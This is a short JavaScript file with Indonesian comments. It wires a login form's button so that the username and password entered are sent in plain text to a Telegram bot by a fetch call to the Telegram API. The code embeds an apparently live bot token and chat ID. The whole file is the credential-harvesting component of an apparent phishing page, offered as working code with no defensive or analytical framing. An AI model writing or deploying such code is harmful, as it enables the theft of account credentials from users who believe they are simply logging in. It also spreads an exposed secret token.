document.getElementById('sendToTelegram').addEventListener('click', function(event) {
    event.preventDefault(); // Mencegah reload halaman

    // Ambil nilai dari input
    var username = document.getElementById('username').value;
    var password = document.getElementById('password').value;

    // Data bot Telegram
    var botToken = '8053803178:AAHnlfGLjgotTDU0YPrEImFJ-9DB7J1T11s'; // Ganti dengan Token Bot Anda
    var chatId = '6820629880'; // Ganti dengan chat ID Anda

    // Pesan yang akan dikirim
    var message = 'Login Details:\nUsername: ' + username + '\nPassword: ' + password;

    // URL API Telegram
    var telegramUrl = 'https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message);

    // Mengirim pesan ke Telegram menggunakan fetch API
    fetch(telegramUrl)
        .then(response => response.json())
        .then(data => {
            if(data.ok) {
                alert('Pesan berhasil dikirim ke Telegram!');
            } else {
                alert('Gagal mengirim pesan.');
            }
        })
        .catch(error => {
            console.error('Error:', error);
            alert('Terjadi kesalahan saat mengirim pesan.');
        });
});
